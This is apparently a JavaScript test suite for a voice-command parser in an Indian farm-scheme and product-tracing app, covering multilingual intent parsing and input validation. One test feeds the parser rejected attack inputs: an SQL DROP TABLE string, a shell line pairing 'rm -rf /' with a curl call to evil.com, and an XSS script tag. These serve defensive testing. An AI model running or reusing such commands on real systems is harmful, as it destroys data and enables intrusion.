import test from "node:test";
import assert from "node:assert/strict";
import {
  parseVoiceCommand,
  sanitizeVoiceInput,
  SUPPORTED_VOICE_LANGUAGES,
} from "../utils/voiceCommandParser.js";
import translations, { INDIAN_LANGUAGES } from "../locales/index.js";

test("Supports English, Hindi (Haryanvi-compatible), Punjabi, and all 27 Indian regional languages", () => {
  const codes = SUPPORTED_VOICE_LANGUAGES.map((l) => l.code);
  assert.ok(codes.includes("en-IN"));
  assert.ok(codes.includes("hi-IN"));
  assert.ok(codes.includes("pa-IN"));
  assert.ok(codes.includes("bn-IN"));
  assert.ok(codes.includes("te-IN"));
  assert.ok(codes.includes("mr-IN"));
  assert.ok(codes.includes("ta-IN"));
  assert.ok(codes.includes("gu-IN"));
  assert.ok(codes.includes("kn-IN"));
  assert.ok(codes.includes("ml-IN"));
  assert.ok(codes.includes("or-IN"));
  assert.ok(codes.includes("as-IN"));
  assert.ok(codes.includes("ur-IN"));

  assert.equal(INDIAN_LANGUAGES.length, 27);
  for (const lang of INDIAN_LANGUAGES) {
    assert.ok(translations[lang.code], `Expected translation dictionary for ${lang.code}`);
    assert.ok(translations[lang.code]["nav.title"], `Expected nav.title for ${lang.code}`);
    assert.ok(translations[lang.code]["nav.schemes"], `Expected nav.schemes for ${lang.code}`);
  }
});

test("Parses all 8 English natural-language farmer voice requests accurately", () => {
  // 1. "Show the latest organic farming schemes."
  const c1 = parseVoiceCommand("Show the latest organic farming schemes.");
  assert.equal(c1.type, "FILTER_SCHEMES");
  assert.equal(c1.params.category, "ORGANIC_FARMING");
  assert.ok(c1.route.includes("category=ORGANIC_FARMING"));

  // 2. "Find subsidies for organic fertilizers."
  const c2 = parseVoiceCommand("Find subsidies for organic fertilizers.");
  assert.equal(c2.type, "FILTER_SCHEMES");
  assert.equal(c2.params.category, "ORGANIC_FARMING");
  assert.equal(c2.params.q, "fertilizer");

  // 3. "Which schemes are available for farmers in Haryana?"
  const c3 = parseVoiceCommand("Which schemes are available for farmers in Haryana?");
  assert.equal(c3.type, "FILTER_SCHEMES");
  assert.equal(c3.params.state, "Haryana");
  assert.ok(c3.route.includes("state=Haryana"));

  // 4. "Show financial assistance for FPOs."
  const c4 = parseVoiceCommand("Show financial assistance for FPOs.");
  assert.equal(c4.type, "FILTER_SCHEMES");
  assert.equal(c4.params.beneficiaryType, "FPO");
  assert.ok(c4.route.includes("beneficiaryType=FPO"));

  // 5. "Track my organic product using its QR code."
  const c5 = parseVoiceCommand("Track my organic product using its QR code.");
  assert.equal(c5.type, "TRACE_BATCH");
  assert.equal(c5.route, "/trace/ORG-BAS-001");
  assert.equal(c5.params.openQrScanner, true);

  // 6. "Verify the blockchain record for this product."
  const c6 = parseVoiceCommand("Verify the blockchain record for this product.");
  assert.equal(c6.type, "VERIFY_BLOCKCHAIN");
  assert.equal(c6.route, "/trace/ORG-BAS-001");
  assert.equal(c6.params.highlightVerification, true);

  // 7. "Show schemes for agricultural storage facilities."
  const c7 = parseVoiceCommand("Show schemes for agricultural storage facilities.");
  assert.equal(c7.type, "FILTER_SCHEMES");
  assert.equal(c7.params.category, "STORAGE");

  // 8. "Find government support for my farming business."
  const c8 = parseVoiceCommand("Find government support for my farming business.");
  assert.equal(c8.type, "FILTER_SCHEMES");
  assert.equal(c8.params.beneficiaryType, "AGRI_ENTREPRENEUR");
});

test("Parses Hindi and Haryanvi-compatible voice commands accurately", () => {
  const h1 = parseVoiceCommand("नवीनतम जैविक खेती योजनाएं दिखाएं।");
  assert.equal(h1.type, "FILTER_SCHEMES");
  assert.equal(h1.params.category, "ORGANIC_FARMING");

  const h2 = parseVoiceCommand("हरियाणा के किसानों के लिए कौन सी योजनाएं उपलब्ध हैं?");
  assert.equal(h2.type, "FILTER_SCHEMES");
  assert.equal(h2.params.state, "Haryana");

  const h3 = parseVoiceCommand("एफपीओ (FPO) के लिए वित्तीय सहायता दिखाएं।");
  assert.equal(h3.type, "FILTER_SCHEMES");
  assert.equal(h3.params.beneficiaryType, "FPO");

  const h4 = parseVoiceCommand("इस उत्पाद का ब्लॉकचेन रिकॉर्ड सत्यापित करें।");
  assert.equal(h4.type, "VERIFY_BLOCKCHAIN");
  assert.equal(h4.route, "/trace/ORG-BAS-001");

  const h5 = parseVoiceCommand("मेरी फसल मेरा ब्यौरा योजना खोलें");
  assert.equal(h5.type, "OPEN_SCHEME");
  assert.equal(h5.route, "/schemes/HARYANA-ORGANIC-PROTSAHAN");
});

test("Handles empty input, specific scheme lookup, and rejects SQL/shell/XSS injection attempts", () => {
  const emptyRes = parseVoiceCommand("   ");
  assert.equal(emptyRes.type, "EMPTY");

  const pkvyRes = parseVoiceCommand("Open Paramparagat Krishi Vikas Yojana PKVY");
  assert.equal(pkvyRes.type, "OPEN_SCHEME");
  assert.equal(pkvyRes.route, "/schemes/PKVY");

  const portalRes = parseVoiceCommand("Open official portal for PM-KISAN");
  assert.equal(portalRes.type, "OPEN_OFFICIAL_PORTAL");
  assert.equal(portalRes.requiresConfirmation, true);

  // Reject SQL Injection
  const sqlInjection = parseVoiceCommand("DROP TABLE GovernmentScheme; --");
  assert.equal(sqlInjection.type, "REJECTED_UNSAFE");
  assert.equal(sqlInjection.route, null);

  // Reject Shell Injection
  const shellInjection = parseVoiceCommand("rm -rf / && curl http://evil.com");
  assert.equal(shellInjection.type, "REJECTED_UNSAFE");

  // Reject XSS
  const xssAttempt = parseVoiceCommand("<script>alert('xss')</script>");
  assert.equal(xssAttempt.type, "REJECTED_UNSAFE");

  assert.equal(sanitizeVoiceInput("  Hello <script> world  "), "Hello script world");
});

test("Parses specific Batch IDs, navigation intents, and handles null/non-string boundary inputs safely", () => {
  const nullRes = parseVoiceCommand(null);
  assert.equal(nullRes.type, "EMPTY");

  const undefRes = parseVoiceCommand(undefined);
  assert.equal(undefRes.type, "EMPTY");

  const traceSpecific = parseVoiceCommand("Trace batch ORG-TUR-002");
  assert.equal(traceSpecific.type, "TRACE_BATCH");
  assert.equal(traceSpecific.route, "/trace/ORG-TUR-002");

  const punjabSchemes = parseVoiceCommand("Show organic schemes in Punjab");
  assert.equal(punjabSchemes.type, "FILTER_SCHEMES");
  assert.equal(punjabSchemes.params.state, "Punjab");
});
